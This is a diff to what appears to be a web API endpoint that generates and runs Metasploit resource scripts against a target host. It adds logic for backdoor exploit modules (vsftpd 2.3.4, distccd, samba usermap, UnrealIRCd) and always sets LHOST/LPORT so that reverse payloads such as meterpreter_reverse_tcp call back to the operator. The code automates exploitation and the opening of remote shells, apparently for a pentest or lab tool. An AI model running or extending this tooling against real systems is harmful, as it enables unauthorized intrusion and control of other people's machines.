@@ -4355,21 +4355,31 @@ async def exploit_msf(req: ExploitRequest, user=Depends(verify_token)):
     # interact directly with a backdoor) — they don't open a listener on our
     # side, so LHOST/LPORT are not relevant for them.
     is_reverse = not any(x in payload for x in ["interact", "bind", "find_tag"])
-    # LHOST only required for reverse-shell payloads — backdoor/interact
-    # payloads (like cmd/unix/interact for vsftpd 2.3.4) don't need it.
-    if is_reverse and not effective_lhost:
-        return {"error": "LHOST required for reverse payload " + payload}
-    lhost_block = f"set LHOST {effective_lhost}\nset LPORT {req.lport}\n" if is_reverse and effective_lhost else ""
+    # Backdoor-style modules (vsftpd 2.3.4, distccd, samba usermap, ircd) — in
+    # modern Metasploit these no longer expose cmd/unix/interact; the module
+    # default is something like cmd/linux/http/x86/meterpreter_reverse_tcp,
+    # which is a reverse payload that DOES need LHOST/LPORT. So for these
+    # modules: skip "set PAYLOAD" (let MSF pick its compatible default) BUT
+    # always send LHOST/LPORT regardless of whether the user's stated payload
+    # looked like a non-reverse one.
+    backdoor_indicators = ["vsftpd_234", "distcc_exec", "samba/usermap", "unreal_ircd", "ircd_3281_backdoor"]
+    is_backdoor_module = any(b in module.lower() for b in backdoor_indicators)
 
-    # For "interact"-style backdoor payloads, MSF needs the backdoor's listen
-    # port (DPORT for vsftpd 2.3.4 = 6200), not LHOST/LPORT. The default in
-    # the module is correct, so we don't override.
+    # Backdoor modules in modern MSF default to reverse payloads → always
+    # supply LHOST. For other modules, only when the explicit payload is
+    # reverse-style.
+    needs_lhost = is_backdoor_module or is_reverse
+    if needs_lhost and not effective_lhost:
+        return {"error": "LHOST required (module default payload is reverse)"}
+    lhost_block = f"set LHOST {effective_lhost}\nset LPORT {req.lport}\n" if needs_lhost and effective_lhost else ""
+    payload_block = "" if is_backdoor_module else f"set PAYLOAD {payload}\n"
+
     rc = (
         f"use {module}\n"
         f"set RHOSTS {host}\n"
         f"set RPORT {req.port}\n"
         + lhost_block +
-        f"set PAYLOAD {payload}\n"
+        payload_block +
         f"set ExitOnSession false\n"
         f"run -j\n"
         f"sleep 25\n"
